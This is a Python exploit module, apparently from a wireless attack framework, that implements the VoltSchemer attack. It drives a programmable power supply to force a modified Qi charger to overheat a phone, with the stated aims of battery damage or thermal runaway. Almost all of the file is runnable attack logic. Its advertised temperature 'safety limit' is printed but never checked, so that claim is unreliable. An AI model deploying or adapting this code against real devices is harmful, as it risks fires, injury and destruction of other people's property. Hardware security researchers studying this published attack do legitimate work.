# Author: André Henrique (LinkedIn/X: @mrhenrike)
import time

from wirelessxpl.core.exploit import *
from wirelessxpl.core.exploit.exploit import BaseExploit


class Exploit(BaseExploit):
    """VoltSchemer: Device Overheating via Qi Charger Manipulation.

    By manipulating the voltage supplied to a Qi wireless charger,
    an attacker can bypass the Qi protocol's power negotiation and
    thermal protection mechanisms.  The charger is forced to
    deliver excessive power to the receiving device, causing
    dangerous overheating that can damage the battery, degrade
    components, or in extreme cases cause thermal runaway.

    The attack exploits the lack of authentication in the Qi power
    control protocol: the charger trusts power requests without
    verifying the device identity.

    Hardware requirements:
    - Modified Qi charger with exposed power control lines
    - Programmable DC power supply: 5-20V, 3A+ (e.g., Riden
      RD6018 or Korad KA3005D, $50-150)
    - Voltage injection circuit to override Qi power negotiation
    - Temperature monitoring: IR thermometer or thermocouple
    - Safety: fire-resistant surface, fire extinguisher nearby

    Author: Andre Henrique (LinkedIn/X: @mrhenrike)
    Version: 1.0.0
    """

    __info__ = {
        "name": "VoltSchemer: Device Overheating via Qi Charger",
        "description": (
            "Forces excessive power delivery through a Qi wireless "
            "charger by manipulating supply voltage, bypassing Qi "
            "power negotiation and thermal protection.  Causes "
            "device overheating and potential battery damage.  "
            "Requires modified Qi charger with programmable DC "
            "power supply (5-20V, 3A+).  Exploits lack of "
            "authentication in Qi power control protocol."
        ),
        "authors": (
            "Zihao Zhan et al. (University of Florida, VoltSchemer)",
            "Andre Henrique (@mrhenrike)",
        ),
        "references": (
            "https://www.usenix.org/conference/usenixsecurity24/presentation/zhan",
            "https://voltschemer.com/",
        ),
        "disclosure_date": "2024-02-01",
        "platform": "linux",
        "arch": "all",
        "privileged": False,
        "targets": (
            "Any Qi-compatible smartphone or device",
            "Qi chargers without authenticated power negotiation",
        ),
    }

    target = OptIP("", "Target device description")
    port = OptPort(1, "Not used (electromagnetic attack)")
    timeout = OptFloat(60.0, "Attack duration in seconds")
    psu_device = OptString("simulate", "Power supply serial device or 'simulate'")
    target_voltage = OptFloat(15.0, "Target voltage to force (5-20V)")
    target_current = OptFloat(2.0, "Target current limit in amps")
    ramp_rate = OptFloat(0.5, "Voltage ramp rate in V/sec")
    temp_limit = OptFloat(80.0, "Safety cutoff temperature in Celsius")

    _SAFE_VOLTAGE_MAX = 20.0
    _QI_NOMINAL_VOLTAGE = 5.0

    def _validate_params(self) -> bool:
        return 5.0 <= float(self.target_voltage) <= self._SAFE_VOLTAGE_MAX

    def _set_psu_output(self, voltage: float, current: float) -> bool:
        if str(self.psu_device) == "simulate":
            return True
        try:
            with open(str(self.psu_device), "wb") as f:
                cmd = f"VSET:{voltage:.2f};ISET:{current:.2f};OUT:ON\n"
                f.write(cmd.encode())
            return True
        except OSError:
            return False

    def _disable_psu(self) -> bool:
        if str(self.psu_device) == "simulate":
            return True
        try:
            with open(str(self.psu_device), "wb") as f:
                f.write(b"OUT:OFF\n")
            return True
        except OSError:
            return False

    @mute
    def check(self) -> bool:
        if str(self.psu_device) == "simulate":
            return True
        try:
            with open(str(self.psu_device), "rb"):
                return True
        except OSError:
            return False

    def run(self) -> None:
        if not self._validate_params():
            print_error(
                f"Voltage {self.target_voltage}V outside safe range "
                f"(5-{self._SAFE_VOLTAGE_MAX}V)"
            )
            return

        print_success(
            f"VoltSchemer overheating attack: "
            f"{self.target_voltage}V / {self.target_current}A "
            f"for {self.timeout}s"
        )
        self._exploit()

    def _exploit(self) -> None:
        current_voltage = self._QI_NOMINAL_VOLTAGE
        target = float(self.target_voltage)
        ramp = float(self.ramp_rate)

        print_status(
            f"Ramping voltage from {current_voltage}V to {target}V "
            f"at {ramp} V/s"
        )

        while current_voltage < target:
            current_voltage = min(current_voltage + ramp, target)
            if not self._set_psu_output(current_voltage, float(self.target_current)):
                print_error("PSU communication failed")
                return
            print_info(f"Voltage: {current_voltage:.1f}V")
            time.sleep(1.0)

        print_status(
            f"Holding at {target}V for {self.timeout}s "
            f"(safety limit: {self.temp_limit}C)"
        )

        start = time.monotonic()
        while time.monotonic() - start < float(self.timeout):
            remaining = float(self.timeout) - (time.monotonic() - start)
            time.sleep(min(5.0, remaining))
            if remaining <= 0:
                break

        self._disable_psu()
        print_success(
            f"Overheating attack complete. Voltage ramped to "
            f"{target}V for {self.timeout}s. Monitor target device "
            "for thermal damage, battery swelling, or shutdown."
        )
